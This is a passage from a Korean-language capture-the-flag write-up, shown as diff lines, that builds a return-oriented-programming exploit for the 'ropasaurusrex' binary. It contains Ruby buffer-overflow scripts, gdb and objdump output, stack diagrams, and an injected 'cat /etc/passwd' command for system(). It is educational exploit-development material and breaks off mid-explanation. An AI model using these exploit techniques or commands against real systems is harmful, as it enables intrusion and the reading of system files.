+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">/sploit</span><span class="o">.</span><span class="n">rb</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Generate the payload</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+</span><span class='line'>  <span class="o">[</span>
+</span><span class='line'>    <span class="mh">0x42424242</span><span class="p">,</span>
+</span><span class='line'>  <span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53451
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>gdb --quiet ./ropasaurusrex core
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이게 익스플로잇의 시작이다!</p>
+
+<h2>어떻게 ASLR로 시간을 낭비하는가</h2>
+
+<p>이 섹션을 &lsquo;시간 낭비&#8217;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.</p>
+
+<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?</p>
+
+<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 우리가 예를 들어 <code>system("cat /etc/passwd")</code>를 실행할 수 있다면, 끝난 거다! 한 번 이걸 하면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지를 포함한다:</p>
+
+<ol>
+<li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기</li>
+<li><code>system()</code> 함수 실행하기</li>
+</ol>
+
+
+<h3>메모리에 문자열 넣기</h3>
+
+<p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:</p>
+
+<ol>
+<li>우리가 쓸 수 있는 메모리를 찾기</li>
+<li>그 메모리에 쓸 수 있는 함수 찾기</li>
+</ol>
+
+
+<p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  | grep -A1 <span class="s1">&#39;\.data&#39;</span>
+</span><span class='line'> 23 .data         00000008  08049620  08049620  00000620  2**2
+</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'> 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
+</span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 <code>0x08049530</code>을 덮어쓰기로 하자.</p>
+
+<p>다음 단계는 주소 <code>0x08049530</code>에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리가 뭘 가지고 있는지 살펴보자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -R ropasaurusrex
+</span><span class='line'>
+</span><span class='line'>ropasaurusrex:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>DYNAMIC RELOCATION RECORDS
+</span><span class='line'>OFFSET   TYPE              VALUE
+</span><span class='line'>08049600 R_386_GLOB_DAT    __gmon_start__
+</span><span class='line'>08049610 R_386_JUMP_SLOT   __gmon_start__
+</span><span class='line'>08049614 R_386_JUMP_SLOT   write
+</span><span class='line'>08049618 R_386_JUMP_SLOT   __libc_start_main
+</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이렇게 생겼을 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>당신이 <code>read()</code> 함수에 진입했을 때, 스택이 이렇게 되길 원하는 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 스택 프레임 시작점
+</span><span class='line'>|     size_t count     | - count, strlen("cat /etc/passwd")
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       | - 쓸 수 있는(writable) memory, 0x08049530
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | - 'stdin' (0)이어야 한다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | - 'read'가 반환할 곳
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | - 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="n">sploit</span><span class="o">.</span><span class="n">rb</span>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
+</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -x</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
+</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
+</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
+</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Generate the payload</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+</span><span class='line'>  <span class="o">[</span>
+</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span> <span class="c1"># number of bytes</span>
+</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>        <span class="c1"># writable memory</span>
+</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>          <span class="c1"># stdin</span>
+</span><span class='line'>    <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># read&#39;s return address</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
+</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># Clean up</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>공격 대상에 실행해 보자:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 크래시를 일으키는 걸 확인해라:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53456
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 <code>0x08049530</code>의 메모리에 썼다는 걸 확인해라:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s 0x08049530
+</span><span class='line'>0x8049530:       <span class="s2">&quot;cat /etc/passwd&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>완벽하다!</p>
+
+<h3>실행하기</h3>
+
+<p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ldd ./ropasaurusrex
+</span><span class='line'>        linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7703000<span class="o">)</span>
+</span><span class='line'>        libc.so.6 <span class="o">=</span>&gt; /lib/i686/cmov/libc.so.6 <span class="o">(</span>0xb75aa000<span class="o">)</span>
+</span><span class='line'>        /lib/ld-linux.so.2 <span class="o">(</span>0xb7704000<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 | grep system
+</span><span class='line'>000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
+</span><span class='line'>00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
+</span><span class='line'>00039450  w   DF .text  0000007d  GLIBC_2.0   system
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
+</span><span class='line'>0xb7ec2450 &lt;system&gt;:    0x890cec83
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>system()</code>은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 꽤 쉽다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
+</span><span class='line'>|      void *arg       | - buffer, 0x08049530
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   | - 'system'이 반환되는 주소
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          | - 상관 없다, system() 지역 변수를 위해 사용할 것이다.
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 이걸 <code>read()</code> 프레임 위에 쌓으면 제법 괜찮아 보인다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
+</span><span class='line'>|     size_t count     |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        |
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>read()</code>가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. <code>read()</code>가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
+</span><span class='line'>|     size_t count     |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of system]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>어라, 이건 좋지 않다! <code>system()</code>에 진입할 때, 스택 포인터가 우리가 원하는 <code>system()</code> 프레임 바닥이 아닌 <code>read()</code> 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?</p>
+
+<p>사실, ROP 익스플로잇을 수행할 때, <code>pop/pop/ret</code>이라는 굉장히 중요한 구조가 있다. 이 경우엔 <code>pop/pop/pop/ret</code>이며 이걸 줄여 &ldquo;pppr&#8221;이라고 부르자. 스택을 비우기에 충분한 &#8220;pop&#8221;들 뒤에 return이라는 것만 기억해라.</p>
+
+<p>스택에서 원하지 않는 것들을 지우기 위해 <code>pop/pop/pop/ret</code>을 사용한다. <code>read()</code>는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 <code>read()</code>가 <code>pop/pop/pop/ret</code>으로 반환한 직후의 스택을 그려보자면 이렇다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret을 위한 특별한 프레임
+</span><span class='line'>| [address of system]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
+</span><span class='line'>|     size_t count     |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&ldquo;pop/pop/pop/ret&#8221;이 실행되고, 반환하기 직전엔 다음과 같다:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
+</span><span class='line'>|      void *arg       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|   [return address]   |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
+</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|     size_t count     | &lt;-- read()의 프레임
+</span><span class='line'>+----------------------+
+</span><span class='line'>|      void *buf       |
+</span><span class='line'>+----------------------+
+</span><span class='line'>|        int fd        |
+</span><span class='line'>+----------------------+
+</span><span class='line'>| [address of "pppr"]  |
+</span><span class='line'>+----------------------+
+</span><span class='line'>
+</span><span class='line'>+----------------------+
+</span><span class='line'>|         ...          |
+</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이게 반환하면, 정확히 우리가 원하는 것을 얻을 수 있다:</p>
+
